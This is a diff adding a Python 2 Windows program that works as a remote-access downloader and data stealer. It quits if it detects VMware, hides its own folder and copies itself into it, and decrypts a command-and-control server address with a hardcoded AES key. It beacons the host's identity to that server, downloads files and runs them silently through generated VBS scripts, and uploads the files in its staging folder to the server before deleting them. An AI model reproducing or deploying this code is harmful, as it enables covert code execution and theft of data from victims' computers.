@@ -1,0 +1,249 @@
+from urllib2 import urlopen
+from urllib import urlencode 
+from glob import glob
+from os import path , makedirs, remove, popen2, popen, getpid, kill, rename
+from fileinput import FileInput
+from socket import gethostname
+from time import sleep, time
+from re import findall, IGNORECASE
+from psutil import get_pid_list, Process
+from sys import exit, argv, stdout
+from platform import platform
+from random import sample,randint
+from requests import post
+from thread import start_new_thread
+from Crypto.Cipher import AES
+from base64 import b64decode
+
+def SysInfo():
+    values  = {}
+    cache   = popen2("SYSTEMINFO")
+    source  = cache[1].read()
+    sysOpts = ["System Model"]
+
+    for opt in sysOpts:
+        values[opt] = [item.strip() for item in findall("%s:\w*(.*?)\n" % (opt), source, IGNORECASE)][0]
+    return values
+
+
+def folder():
+    if not path.exists(dir2+"folder.txt"):
+        foldername1 = "moxzer02"                       # Foldername
+        fol = open(dir2+"folder.txt",'wb')
+        fol.write(foldername1)
+        fol.close
+    else:
+        fol = open(dir2+"folder.txt",'rb')
+        foldername1 = fol.read()
+        fol.close()
+    return foldername1
+
+
+
+
+def getserver():
+    if not path.exists(dir2+"ip.txt"):
+        encryption = "oHuTD+MUEAbPswQznL/LVQ=="    # server name 
+        enc = open(dir2+"ip.txt",'wb')
+        enc.write(encryption)
+        enc.close()
+    else:
+        enc = open(dir2+"ip.txt",'rb')
+        encryption = enc.read()
+        enc.close()
+    PADDING = '{'
+    DecodeAES = lambda c, e: c.decrypt(b64decode(e)).rstrip(PADDING)
+    key = "123456789!@#$%^&"     # key
+    cipher = AES.new(key)
+    decoded = DecodeAES(cipher, encryption)
+    return decoded
+
+def rFile(ext):
+    sleep(1)
+    alphabet = 'abcdefghijklmnopqrstuvwxyz'
+    min = 5
+    max = 5
+    name = sample(alphabet,randint(min,max))
+    ranstring = ''.join(name)
+    data2len = len(ext)
+    if data2len <> 0:
+            try:
+                    ffile4 = open(dir2+ranstring+'.vbs','wb')
+                    data12='Set WshShell = CreateObject("WScript.Shell" )\n'
+                    data12+='WshShell.Run chr(34) & "'+ext+'" & Chr(34), 0\n'
+                    data12+='Set WshShell = Nothing'
+                    ffile4.write(data12)
+                    ffile4.close()
+                    size1 = path.getsize(ext)
+                    if size1 <> 0:
+                        sleep(2)
+                        the_output = popen(dir2+ranstring+".vbs").read()
+                        remove(dir2+ranstring+".vbs")
+                        return 0
+                    else:
+                        remove(ext)
+                        remove(dir2+ranstring+".vbs")
+                        return 1
+            except:
+                return 1
+                pass
+
+
+def dFile1(hname,fname,bname):
+    dfiles12 = ''
+    dfiles12 = glob(dir2+"*.exe")
+    for gfile6 in dfiles12:
+        try:
+            rFile(gfile6)
+        except:
+            continue
+    count = 599
+    ocount = 8
+    while True:
+        sleep(1)
+        if not path.exists(dir2+"complete.txt"):
+            osname = platform().split("-")
+            osname1 = osname[1].replace("\n","")
+            if osname1 == "XP":
+                dfiles4 = "file.txt"
+                f = 1
+                s  = 1
+            else:
+                dfiles4 = "file.txt"
+                f = 1
+                s = 1
+        else:
+            f = 0
+            s = 0
+        count = count + 1
+        ocount = ocount + 1
+        try:
+            if count == 600:
+                dfiles4 = urlopen("http://"+ getserver() + "/getfile.php")
+                count = 0
+                f = 1
+                s = 0
+            if ocount == 11:
+                   dfiles4 = urlopen("http://"+ getserver() + "/online.php?sysname=%s&fname=%s&sip=%s"%(hname,fname,getserver()))
+                   ocount = 0
+                   f = 1
+                   s = 0
+            if f <> 0:
+                if s == 1:
+                    dfiles5 = dfiles4
+                else:
+                    dfiles5 = dfiles4.read()
+                dfiles6 = dfiles5.split(';')
+                ffile10 = glob(dir2+"*")
+                for gfile2 in dfiles6:
+                    try:
+                        if not (dir2+gfile2 in ffile10) or (gfile2.find('.txt') <> -1):
+                            f11 = urlopen("http://"+ getserver() + "/appstore2/%s"%gfile2)    
+                            ffile6=open(dir2+"%s"%gfile2,'wb')
+                            ffile6.write(f11.read())
+                            ffile6.close()
+                            gfile3 = ''
+                            gfile3 = dir2+gfile2
+                            if gfile2 == "file.txt" or gfile2 == "file.txt":
+                                #the_output = popen(dir2+gfile2+" %s %s"%(bname,dir2)).read()
+                                remove(dir2+gfile2)
+                                ffile12=open(dir2+"complete.txt",'wb')
+                                ffile12.write(gfile2)
+                                ffile12.close
+                            elif gfile2.find(".txt") <> -1:
+                                    print "hi"
+                            else:
+                                task = rFile(gfile3)
+                    except:
+                        continue
+            
+        except:
+            pass
+
+def sender(filename,hnames):
+    url = 'http://'+getserver()+'/upload.php?folder=%s&%s'%(folder(),hnames)
+    with open(filename, 'rb') as f:
+        response = post(url, files={'uploadedfile': f})
+    return 0
+
+def killpid(bname):  
+    pcount = 0
+    xx = get_pid_list()
+    myid = getpid()
+    for i in xx:
+        try:
+            pro =  Process(i).name
+            if pro.find(bname) <> -1:
+                if i != myid:
+                    p = i
+                pcount = pcount + 1
+        except:
+            continue
+    if pcount > 2:
+        exit(0)
+    try:
+        kill(p, 9)
+    except:
+        pass
+
+if __name__ == "__main__":
+    try:
+        sysinfo1 = SysInfo()
+        sysinfo2 = str(sysinfo1)
+    except:
+        sysinfo2 = "Test"
+        pass
+    if sysinfo2.find("VMware") <> -1:
+        print "VMware"
+        exit(0)
+    
+    dir1 = "c:\\SystemVolumeCache\\"
+    dir3 = "c:\\SystemVolumeCache"
+    dir2 = "c:\\SystemVolumeCache\\Programs\\"
+    dir4 = "Programs"
+        
+    _file = path.abspath(argv[0])
+    fpath = path.dirname(path.realpath(_file)) 
+    bname = path.basename(_file)
+    killpid(bname)
+    if not path.exists(dir1):
+        makedirs(dir1)
+    if not path.exists(dir2):
+        makedirs(dir2)
+    the_output = popen("attrib +h +s %s"%(dir3)).read()
+    the_output = popen("copy %s %s"%(bname,dir2)).read()
+    cname = gethostname()
+    hserial = popen('vol '+'c:', 'r').read()
+    hserial = hserial.split()
+    hserial =  hserial[len(hserial)-1:]
+    for d in hserial:
+        serial = d
+    hname = cname+'-'+serial
+    try:
+        start_new_thread ( dFile1, (hname,folder(),bname, ) )
+    except:
+        pass
+while True:
+    try:
+        sleep(1)
+        files2 = glob(dir1+"*")
+        for file1 in files2: 
+            try:
+                        if path.isdir(file1):
+                            continue
+                        try:
+                                myfiles = open(file1, "r+")
+                        except:
+                                continue
+                        myfiles = ''
+                        x = urlencode({'foldername': hname})
+                        va = sender(file1,x)
+                        if va == 0:
+                            remove(file1)
+                        sleep(2)
+            except Exception,e:
+                    print e
+                    pass
+    except:
+            pass
+
